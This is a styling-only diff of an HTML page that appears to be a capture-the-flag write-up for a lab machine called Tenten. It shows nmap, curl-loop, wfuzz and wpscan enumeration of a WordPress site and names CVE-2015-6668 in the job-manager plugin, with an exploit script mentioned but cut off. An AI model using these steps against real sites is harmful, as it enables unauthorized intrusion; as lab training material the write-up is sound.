@@ -201,427 +201,427 @@
 
       <div class="post-content">
         <h1 id="nmap">nmap</h1>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># Nmap 7.60 scan initiated Fri Feb 28 10:29:31 2020 as: nmap -sC -sV -oA nmap/tenten 10.10.10.10</span>
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> tenten.htb <span style="color:#ff79c6">(</span>10.10.10.10<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff79c6">(</span>0.24s latency<span style="color:#ff79c6">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#bd93f9">998</span> filtered ports
-</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
-</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span style="color:#ff79c6">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>| ssh-hostkey:
-</span></span><span style="display:flex;"><span>|   <span style="color:#bd93f9">2048</span> ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>|   <span style="color:#bd93f9">256</span> cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>|_  <span style="color:#bd93f9">256</span> 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 <span style="color:#ff79c6">(</span>EdDSA<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.18 <span style="color:#ff79c6">((</span>Ubuntu<span style="color:#ff79c6">))</span>
-</span></span><span style="display:flex;"><span>|_http-generator: WordPress 4.7.3
-</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>|_http-title: Job Portal &amp;<span style="color:#6272a4">#8211; Just another WordPress site</span>
-</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Nmap done at Fri Feb 28 10:30:05 2020 -- 1 IP address (1 host up) scanned in 33.77 seconds</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># Nmap 7.60 scan initiated Fri Feb 28 10:29:31 2020 as: nmap -sC -sV -oA nmap/tenten 10.10.10.10</span>
+Nmap scan report <span style="color:#ff79c6">for</span> tenten.htb <span style="color:#ff79c6">(</span>10.10.10.10<span style="color:#ff79c6">)</span>
+Host is up <span style="color:#ff79c6">(</span>0.24s latency<span style="color:#ff79c6">)</span>.
+Not shown: <span style="color:#bd93f9">998</span> filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span style="color:#ff79c6">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff79c6">)</span>
+| ssh-hostkey:
+|   <span style="color:#bd93f9">2048</span> ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
+|   <span style="color:#bd93f9">256</span> cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
+|_  <span style="color:#bd93f9">256</span> 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 <span style="color:#ff79c6">(</span>EdDSA<span style="color:#ff79c6">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span style="color:#ff79c6">((</span>Ubuntu<span style="color:#ff79c6">))</span>
+|_http-generator: WordPress 4.7.3
+|_http-server-header: Apache/2.4.18 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span>
+|_http-title: Job Portal &amp;<span style="color:#6272a4">#8211; Just another WordPress site</span>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#6272a4"># Nmap done at Fri Feb 28 10:30:05 2020 -- 1 IP address (1 host up) scanned in 33.77 seconds</span>
+</code></pre></td></tr></table>
 </div>
 </div><h1 id="website-exploration">Website Exploration</h1>
 <p>There is a job listing, when clicking Apply, we can see an id in the url</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#50fa7b">GET</span> /index.php/jobs/apply/7/ <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
-</span></span><span style="display:flex;"><span>Host<span style="color:#ff79c6">:</span> 10.10.10.10
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#50fa7b">GET</span> /index.php/jobs/apply/7/ <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
+Host<span style="color:#ff79c6">:</span> 10.10.10.10
+</code></pre></td></tr></table>
 </div>
 </div><p>this is eligible for Burp Intruder module &hellip; after visiting the results, we find a page with title <code>HackerAccessGranted</code></p>
 <p>Burp running too slow? no problem try this <code>curl -sk http://10.10.10.10/index.php/jobs/apply/8/ | grep &quot;&lt;title&gt;&quot; | cut -d&quot;:&quot; -f2 | cut -d'&amp;' -f1</code></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt;for i in <span style="color:#f1fa8c">`</span>seq <span style="color:#bd93f9">1</span> 20<span style="color:#f1fa8c">`</span>; <span style="color:#ff79c6">do</span> curl -sk http://10.10.10.10/index.php/jobs/apply/<span style="color:#8be9fd;font-style:italic">$i</span>/ | grep <span style="color:#f1fa8c">&#34;&lt;title&gt;&#34;</span> | cut -d<span style="color:#f1fa8c">&#34;:&#34;</span> -f2 | cut -d<span style="color:#f1fa8c">&#39;&amp;&#39;</span> -f1 ;  <span style="color:#ff79c6">done</span>
-</span></span><span style="display:flex;"><span> Hello world!
-</span></span><span style="display:flex;"><span> Sample Page
-</span></span><span style="display:flex;"><span> Auto Draft
-</span></span><span style="display:flex;"><span>&lt;title&gt;Job Application
-</span></span><span style="display:flex;"><span> Jobs Listing
-</span></span><span style="display:flex;"><span> Job Application
-</span></span><span style="display:flex;"><span> Register
-</span></span><span style="display:flex;"><span> Pen Tester
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> Application
-</span></span><span style="display:flex;"><span> cube
-</span></span><span style="display:flex;"><span> Application
-</span></span><span style="display:flex;"><span> HackerAccessGranted
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;for i in <span style="color:#f1fa8c">`</span>seq <span style="color:#bd93f9">1</span> 20<span style="color:#f1fa8c">`</span>; <span style="color:#ff79c6">do</span> curl -sk http://10.10.10.10/index.php/jobs/apply/<span style="color:#8be9fd;font-style:italic">$i</span>/ | grep <span style="color:#f1fa8c">&#34;&lt;title&gt;&#34;</span> | cut -d<span style="color:#f1fa8c">&#34;:&#34;</span> -f2 | cut -d<span style="color:#f1fa8c">&#39;&amp;&#39;</span> -f1 ;  <span style="color:#ff79c6">done</span>
+ Hello world!
+ Sample Page
+ Auto Draft
+&lt;title&gt;Job Application
+ Jobs Listing
+ Job Application
+ Register
+ Pen Tester
+
+ Application
+ cube
+ Application
+ HackerAccessGranted
+</code></pre></td></tr></table>
 </div>
 </div><p>or wfuzz <code>wfuzz -z range,1-50 --hh 57555 http://10.10.10.10/index.php/jobs/apply/FUZZ/</code></p>
 <h1 id="wpscan">wpscan</h1>
 <p>Adding the alias <code>alias wpscan='docker run -it --rm wpscanteam/wpscan'</code></p>
 <p>We can wpscan wordpress to enumerate users and plugins</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wpscan --url http://10.10.10.10 -e u,p
-</span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> Plugin<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span> Identified:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> job-manager
-</span></span><span style="display:flex;"><span> | Location: http://10.10.10.10/wp-content/plugins/job-manager/
-</span></span><span style="display:flex;"><span> | Latest Version: 0.7.25 <span style="color:#ff79c6">(</span>up to date<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span> ...
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> User<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span> Identified:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> takis
-</span></span><span style="display:flex;"><span> | Found By: Author Posts - Author Pattern <span style="color:#ff79c6">(</span>Passive Detection<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span> | Confirmed By:
-</span></span><span style="display:flex;"><span> |  Rss Generator <span style="color:#ff79c6">(</span>Passive Detection<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span> |  Wp Json Api <span style="color:#ff79c6">(</span>Aggressive Detection<span style="color:#ff79c6">)</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://10.10.10.10 -e u,p
+...
+<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> Plugin<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span> Identified:
+
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> job-manager
+ | Location: http://10.10.10.10/wp-content/plugins/job-manager/
+ | Latest Version: 0.7.25 <span style="color:#ff79c6">(</span>up to date<span style="color:#ff79c6">)</span>
+ ...
+<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> User<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span> Identified:
+
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> takis
+ | Found By: Author Posts - Author Pattern <span style="color:#ff79c6">(</span>Passive Detection<span style="color:#ff79c6">)</span>
+ | Confirmed By:
+ |  Rss Generator <span style="color:#ff79c6">(</span>Passive Detection<span style="color:#ff79c6">)</span>
+ |  Wp Json Api <span style="color:#ff79c6">(</span>Aggressive Detection<span style="color:#ff79c6">)</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>a quick research of job-manager brings us to <a href="https://www.cvedetails.com/cve/CVE-2015-6668/">CVE-2015-6668</a></p>
 <p>It is interesting to note that the CVE does not mention 0.7.25 as vulnerable, but it is vulnerable.</p>
 <p>We want to try to recover the object <code>HackerAccessGranted</code> but we don&rsquo;t know the extension</p>
 <p>A reference to a python exploit <a href="https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/">fetch_uploads.py</a>, allow to download all uploaded files</p>
 <p>The website contains entries for April 2017 only so we can modify the years, months and extensions sections of the script:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
